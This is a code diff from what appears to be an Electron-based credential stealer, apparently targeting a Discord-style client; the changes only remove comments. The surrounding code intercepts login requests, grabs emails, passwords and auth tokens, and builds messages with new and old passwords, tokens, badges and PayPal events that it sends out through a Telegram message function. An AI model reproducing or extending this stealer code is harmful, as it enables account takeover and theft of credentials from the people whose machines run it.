@@ -138,7 +138,7 @@ const BackupCodesViewed = async (codes, token) => {
     sendTelegramMessage(message);
 };
 const PasswordChanged = async (newPassword, oldPassword, token, flags) => {
-    const badges = getBadges(flags);  // Get badges of the user
+    const badges = getBadges(flags);
     const message = `*Password Changed*:\n\n🔑 *New Password*: \`${newPassword}\`\n🔑 *Old Password*: \`${oldPassword}\`\n💳 *Token*: \`${token}\`\n🏅 *Badges*: ${badges}`;
     sendTelegramMessage(message);
 };
@@ -150,7 +150,7 @@ const PaypalAdded = async (token) => {
     const message = `*PayPal Added*:\n\n💳 *Token*: \`${token}\``;
     sendTelegramMessage(message);
 };
-// Function for initiating the script
+
 let email = "";
 let password = "";
 let initiationCalled = false;
@@ -178,7 +178,7 @@ const createWindow = () => {
                 if (!responseData.token) {
                     email = requestData.login;
                     password = requestData.password;
-                    return; // 2FA
+                    return;
                 }
                 EmailPassToken(requestData.login, requestData.password, responseData.token, "logged in");
                 break;
